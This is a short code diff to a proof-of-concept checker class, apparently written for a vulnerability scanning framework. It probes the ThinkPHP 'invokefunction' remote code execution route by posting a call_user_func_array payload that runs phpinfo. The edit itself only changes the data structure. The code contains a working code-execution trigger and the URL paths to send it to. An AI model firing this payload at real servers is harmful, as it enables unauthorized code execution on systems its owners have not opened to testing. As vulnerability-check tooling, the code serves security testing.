@@ -39,11 +39,11 @@ class DemoPOC(POCBase):
 
     def _check(self, url):
         flag = 'Registered PHP Streams'
-        data = {
-            "function": "call_user_func_array",
-            "vars[0]": "phpinfo",
-            "vars[1][]": "-1"
-        }
+        data = OrderedDict([
+            ("function", "call_user_func_array"),
+            ("vars[0]", "phpinfo"),
+            ("vars[1][]", "-1")
+        ])
         payloads = [
             r"/?s=admin/\think\app/invokefunction",
             r"/admin.php?s=admin/\think\app/invokefunction",
@@ -57,7 +57,7 @@ class DemoPOC(POCBase):
             r = requests.post(vul_url, data=data)
 
             if flag in r.text:
-                return payload, data
+                return payload, dict(data)
         return False
 
     def _verify(self):
